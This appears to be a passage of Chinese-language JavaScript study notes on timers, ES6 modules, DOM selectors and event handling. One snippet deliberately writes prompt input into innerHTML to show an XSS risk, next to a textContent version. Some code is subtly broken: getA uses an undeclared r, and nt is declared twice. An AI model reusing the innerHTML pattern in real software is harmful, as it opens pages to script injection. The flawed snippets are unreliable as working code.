<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">let hobby=&quot;篮球&quot;;</span><br><span class="line">let price=100.99;</span><br><span class="line"></span><br><span class="line">//执行的方法，和等候时间</span><br><span class="line">let id1=setTimeout(firstmess,3000,hobby,price);</span><br><span class="line">let id2=setTimeout(secondmess,5000);</span><br><span class="line">let id3=setTimeout(thirdmess,9000);</span><br><span class="line"></span><br><span class="line">function firstmess(hobby,price)&#123;</span><br><span class="line">    alert(`the $&#123;hobby&#125; is $$&#123;price&#125;`);</span><br><span class="line">&#125;</span><br><span class="line">function secondmess()&#123;</span><br><span class="line">    alert(`this is $100`);</span><br><span class="line">&#125;</span><br><span class="line">function thirdmess()&#123;</span><br><span class="line">    alert(`the final`);</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(&quot;mybutton&quot;).onclick=function()&#123;</span><br><span class="line">  //  clearTimeout(id1);</span><br><span class="line">    clearTimeout(id2);//点击按钮后，不会执行id2</span><br><span class="line">    //clearTimeout(id3);</span><br><span class="line">    //alert(`取消id2`);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>setInterval 定时器</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//setInterval() //定时器</span></span><br><span class="line"><span class="keyword">let</span> count=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> max=<span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&quot;输入一个数&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> myTimer=<span class="built_in">setInterval</span>(countUp,<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">countUp</span>(<span class="params"></span>)&#123;</span><br><span class="line">    count+=<span class="number">1</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(count);</span><br><span class="line">    <span class="keyword">if</span>(count&gt;=max)&#123;</span><br><span class="line">        <span class="built_in">clearInterval</span>(myTimer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//间隔一定时间输出1-9</span></span><br></pre></td></tr></table></figure>

<h3 id="钟表设计"><a href="#钟表设计" class="headerlink" title="钟表设计"></a><strong>钟表设计</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mylabel=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mylabel&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">update</span>();</span><br><span class="line"><span class="built_in">setInterval</span>(update,<span class="number">1000</span>); <span class="comment">//动态执行</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">update</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> date=<span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">    <span class="comment">//mylabel.innerHTML=date;</span></span><br><span class="line">    mylabel.<span class="property">innerHTML</span>=<span class="title function_">fomatTime</span>(date);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">fomatTime</span>(<span class="params">date</span>)&#123;<span class="comment">//形式化date</span></span><br><span class="line">        <span class="keyword">let</span> hours=date.<span class="title function_">getHours</span>();</span><br><span class="line">        <span class="keyword">let</span> minutes=date.<span class="title function_">getMinutes</span>();</span><br><span class="line">        <span class="keyword">let</span> seconds=date.<span class="title function_">getSeconds</span>();</span><br><span class="line">        <span class="keyword">let</span> amorpm=hours&gt;=<span class="number">12</span>?<span class="string">&quot;pm&quot;</span>:<span class="string">&quot;am&quot;</span>;</span><br><span class="line"></span><br><span class="line">        hours=(hours%<span class="number">12</span>)||<span class="number">12</span>;<span class="comment">//12小时制</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//单数添0，凑两位</span></span><br><span class="line">        hours=<span class="title function_">singlezero</span>(hours);</span><br><span class="line">        minutes=<span class="title function_">singlezero</span>(minutes);</span><br><span class="line">        seconds=<span class="title function_">singlezero</span>(seconds);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;hours&#125;</span>:<span class="subst">$&#123;minutes&#125;</span>:<span class="subst">$&#123;seconds&#125;</span> <span class="subst">$&#123;amorpm&#125;</span>`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">singlezero</span>(<span class="params">time</span>)&#123;<span class="comment">//单数添0</span></span><br><span class="line">        time=time.<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">return</span> time.<span class="property">length</span>&lt;<span class="number">2</span>?<span class="string">&quot;0&quot;</span>+<span class="attr">time</span>:time;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>promise</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/js/js-promise.html">https://www.runoob.com/js/js-promise.html</a></p>
<h3 id="ES6-moudules"><a href="#ES6-moudules" class="headerlink" title="ES6 moudules"></a><strong>ES6 moudules</strong></h3><p>这个相当于引用外部文件</p>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/es6-module.html">https://www.runoob.com/w3cnote/es6-module.html</a></p>
<p>模块化，导入导出两个模块</p>
<p>给定 math_util.js</p>
<p><strong>导出</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="variable constant_">PI</span>=<span class="number">3.1415926</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">getC</span>(<span class="params">r</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>*<span class="variable constant_">PI</span>*r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">getA</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable constant_">PI</span>*<span class="title class_">Math</span>.<span class="title function_">pow</span>(r,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>导入</strong></p>
<p>index.js去导入</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;<span class="variable constant_">PI</span>,getC,getA&#125; <span class="keyword">from</span> <span class="string">&quot;./math_util.js&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable constant_">PI</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">getC</span>(<span class="number">2</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">getA</span>(<span class="number">2</span>));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">3.1415926</span></span><br><span class="line"><span class="comment">12.5663704</span></span><br><span class="line"><span class="comment">28.2743334</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> <span class="title class_">Mathutil</span> <span class="keyword">from</span> <span class="string">&quot;./math_util.js&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Mathutil</span>.<span class="property">PI</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Mathutil</span>.<span class="title function_">getC</span>(<span class="number">2</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Mathutil</span>.<span class="title function_">getA</span>(<span class="number">3</span>));</span><br></pre></td></tr></table></figure>

<p>html文件的&lt;script&gt;需要引入</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;module&quot;</span> src=<span class="string">&quot;index.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><p>Document Object Model，一种API接口，可以改变页面内容</p>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/js/js-htmldom.html">https://www.runoob.com/js/js-htmldom.html</a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>);<span class="comment">//大致标签</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="variable language_">document</span>);<span class="comment">//细节属性</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">title</span>);<span class="comment">//网页标题</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">URL</span>);<span class="comment">//网页url</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">title</span>=<span class="string">&quot;Here we go!&quot;</span>;<span class="comment">//更改网页标题</span></span><br><span class="line"><span class="comment">//document.location=&quot;http://www.google.com&quot;;//跳转到google页面</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>.<span class="property">backgroundColor</span>=<span class="string">&quot;skyblue&quot;</span>;<span class="comment">//更改页面背景</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mylabel&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;Hello！！&quot;</span>;<span class="comment">//元素名字</span></span><br></pre></td></tr></table></figure>

<h3 id="元素选择器"><a href="#元素选择器" class="headerlink" title="元素选择器"></a>元素选择器</h3><p><strong>name选择</strong></p>
<p>html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;r1&quot;</span> <span class="attr">name</span>=<span class="string">&quot;unit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;蓝色&quot;</span> <span class="attr">checked</span>=<span class="string">&quot;checked&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- checked=&quot;checked&quot; 是默认选中--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;r1&quot;</span>&gt;</span>blue<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;r2&quot;</span> <span class="attr">name</span>=<span class="string">&quot;unit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;红色&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;r2&quot;</span>&gt;</span>red<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> e=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mytitle&quot;</span>);</span><br><span class="line">e.<span class="property">style</span>.<span class="property">backgroundColor</span>=<span class="string">&quot;blue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> color=<span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&quot;unit&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(color[<span class="number">0</span>]);<span class="comment">//&lt;input type=&quot;radio&quot; id=&quot;r1&quot; name=&quot;unit&quot;&gt;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(color[<span class="number">1</span>]);<span class="comment">//&lt;input type=&quot;radio&quot; id=&quot;r2&quot; name=&quot;unit&quot;&gt;</span></span><br><span class="line">color.<span class="title function_">forEach</span>(<span class="function"><span class="params">elem</span>=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(elem.<span class="property">checked</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(elem.<span class="property">value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><img src="/../../../Typora/img111/image-20231111111325343.png"></p>
<p><strong>tagname&#x2F;classname选择</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> co=<span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;li&quot;</span>);</span><br><span class="line">co[<span class="number">0</span>].<span class="property">style</span>.<span class="property">backgroundColor</span>=<span class="string">&quot;lightgreen&quot;</span>;</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>选择器</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-document-queryselector.html">https://www.runoob.com/jsref/met-document-queryselector.html</a></p>
<p> querySelector() 方法仅仅返回匹配指定选择器的第一个元素。如果你需要返回所有的元素，请使用 querySelectorAll() 方法替代</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#id、.class、[for]、li</span></span><br><span class="line"><span class="keyword">let</span> ele=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#mytitle&quot;</span>);</span><br><span class="line">ele.<span class="property">style</span>.<span class="property">backgroundColor</span>=<span class="string">&quot;lightgreen&quot;</span>;</span><br><span class="line"><span class="comment">//全选</span></span><br><span class="line"><span class="keyword">let</span> ele2=<span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;li&quot;</span>);</span><br><span class="line">ele2.<span class="title function_">forEach</span>(<span class="function">(<span class="params">ele</span>)=&gt;</span>ele.<span class="property">style</span>.<span class="property">backgroundColor</span>=<span class="string">&quot;lightgreen&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>添加html元素</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//.innerHTML 容易受到xss攻击</span></span><br><span class="line"><span class="keyword">const</span> nt=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;h1&quot;</span>);</span><br><span class="line">nt.<span class="property">innerHTML</span>=<span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&quot;enter!&quot;</span>);<span class="comment">//输入xss语句的话会执行</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">append</span>(nt);</span><br><span class="line"><span class="comment">//.textContent</span></span><br><span class="line"><span class="keyword">const</span> nt=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;h1&quot;</span>);</span><br><span class="line">nt.<span class="property">textContent</span>=<span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&quot;enter!&quot;</span>);<span class="comment">//实体化为语句，直接输出</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">append</span>(nt);</span><br></pre></td></tr></table></figure>

<p>也可以通过选择器，对某些列表的item，可以添加到末尾，首部或者某item之前</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mylist=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.food&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> listitem=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">listitem.<span class="property">textContent</span>=<span class="string">&quot;114514&quot;</span>;</span><br><span class="line">mylist.<span class="title function_">append</span>(listitem);<span class="comment">//.preitem、insertBefore()</span></span><br></pre></td></tr></table></figure>

<p><strong>事件</strong></p>
<p><strong>onclick</strong>：</p>
<p>way1：</p>
<p>html中</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;mybut&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;dosth()&quot;</span>&gt;</span>点击我<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>  <span class="attr">src</span>=<span class="string">&quot;index.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>js中</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">dosth</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;You did!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>way2：</p>
<p>js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> bt=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mybut&quot;</span>);</span><br><span class="line">bt.<span class="property">onclick</span>=dosth;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">dosth</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;You did!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>onload:</strong></p>
<p>纯js自动触发</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ele=<span class="variable language_">document</span>.<span class="property">body</span>;</span><br><span class="line">ele.<span class="property">onload</span>=dosth;</span><br></pre></td></tr></table></figure>

<p>或者去html的body标签，添加<strong>onload</strong>属性也可以</p>
<p><strong>onmouseover</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对div的颜色改变</span></span><br><span class="line"><span class="comment">//css，将div原本的背景颜色为蓝色，鼠标移动后变为浅绿</span></span><br><span class="line"><span class="keyword">const</span> el=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mydiv&quot;</span>);</span><br><span class="line"></span><br><span class="line">el.<span class="property">onmouseover</span>=change;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">change</span>(<span class="params"></span>)&#123;</span><br><span class="line">    el.<span class="property">style</span>.<span class="property">backgroundColor</span>=<span class="string">&quot;lightgreen&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//离开后恢复为红色</span></span><br><span class="line">el.<span class="property">onmouseout</span>=change1;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">change1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    el.<span class="property">style</span>.<span class="property">backgroundColor</span>=<span class="string">&quot;red&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>添加事件</strong></p>
<p>给一个元素添加事件句柄</p>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-element-addeventlistener.html">https://www.runoob.com/jsref/met-element-addeventlistener.html</a></p>
<p> <code>.addEventListener(event,function,useCapture)</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> e=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mydiv&quot;</span>);</span><br><span class="line">e.<span class="title function_">addEventListener</span>(<span class="string">&quot;mouseover&quot;</span>,<span class="function">()=&gt;</span>e.<span class="property">style</span>.<span class="property">backgroundColor</span>=<span class="string">&quot;red&quot;</span>);</span><br><span class="line">e.<span class="title function_">addEventListener</span>(<span class="string">&quot;mouseout&quot;</span>,<span class="function">()=&gt;</span>e.<span class="property">style</span>.<span class="property">backgroundColor</span>=<span class="string">&quot;lightgreen&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>看起来与正常函数没什么不同，但它有一个<strong>捕获</strong>阶段</p>
<p>html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;outerdiv&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;mydiv&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>css</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#mydiv</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>:blue;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#outerdiv</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>:black;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">200px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../../../Typora/img111/image-20231115125708714.png"></p>
<p>js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> e=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mydiv&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> e1=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;outerdiv&quot;</span>);</span><br><span class="line">e.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>,change);</span><br><span class="line">e1.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>,change);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">change</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">`this is <span class="subst">$&#123;<span class="variable language_">this</span>.id&#125;</span>`</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">backgroundColor</span>=<span class="string">&quot;red&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>点击内层的div时，所有块都会被红，但这个是冒泡阶段，有触发先后</p>
<p>点击 <code>mydiv</code>，先触发 <code>mydiv</code>，再触发 <code>outerdiv</code></p>
<p>但你要这样</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e1.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>,change,<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<p>先 <code>outerdiv</code>，后 <code>mydiv</code>了</p>
<h3 id="keydown"><a href="#keydown" class="headerlink" title="keydown"></a><strong>keydown</strong></h3><p>html</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#mydiv</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>:blue;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid;</span><br><span class="line">    <span class="attribute">position</span>:relative;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mydiv=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mydiv&quot;</span>);</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;keydown&quot;</span>,move);</span><br><span class="line"><span class="keyword">let</span> x=<span class="number">0</span>,y=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">move</span>(<span class="params">event</span>)&#123;</span><br><span class="line">    <span class="keyword">switch</span>(event.<span class="property">key</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;ArrowDown&quot;</span>:</span><br><span class="line">            y+=<span class="number">5</span>;</span><br><span class="line">            mydiv.<span 